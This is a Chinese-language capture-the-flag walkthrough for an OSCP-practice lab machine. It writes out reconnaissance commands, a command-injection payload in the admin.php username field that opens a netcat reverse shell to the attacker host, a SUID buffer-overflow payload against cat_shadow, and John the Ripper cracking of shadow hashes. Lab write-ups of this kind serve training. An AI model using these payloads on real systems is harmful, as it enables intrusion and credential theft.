虚拟机简介：该机器是为准备OSCP而开发的,两个flag：user.txt和proof.txt

目标：1个flag

级别：中级

1、通过arp-scan检测主机IP地址

arp-scan -l

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.129

查看开放22、80端口

3、使用dirb进行目录扫描

dirb http://192.168.207.129

4、登录进行测试

在username字段中存在命令执行

5、反弹shell

执行反弹shell到攻击机中

http://192.168.207.129/admin.php?username=nc -e /bin/bash 192.168.207.130 4444&password=1

成功获取到反弹shell连接

6、使用python生成tty

python -c 'import pty;pty.spawn("/bin/bash")'

7、查看目录中flag信息

ls /home/silky

cat /home/silky/flag.txt

8、查看home目录中存在suid的文件

find / -perm -g=s -type f 2>/dev/null

查看cat_shadow存在suid权限

9、查看文件信息

/home/silky/cat_shadow

/home/silky/cat_shadow silky

10、使用16进制进行溢出

根据溢出内容，进行溢出攻击

./cat_shadow $(python -c 'print "A"*64 + "\x62\x59\x6c\x49"')

11、导出获取的内容并使用John爆破

john shadow --wordlist=/usr/share/wordlists/rockyou.txt

12、切换到root账号，并获取到flag
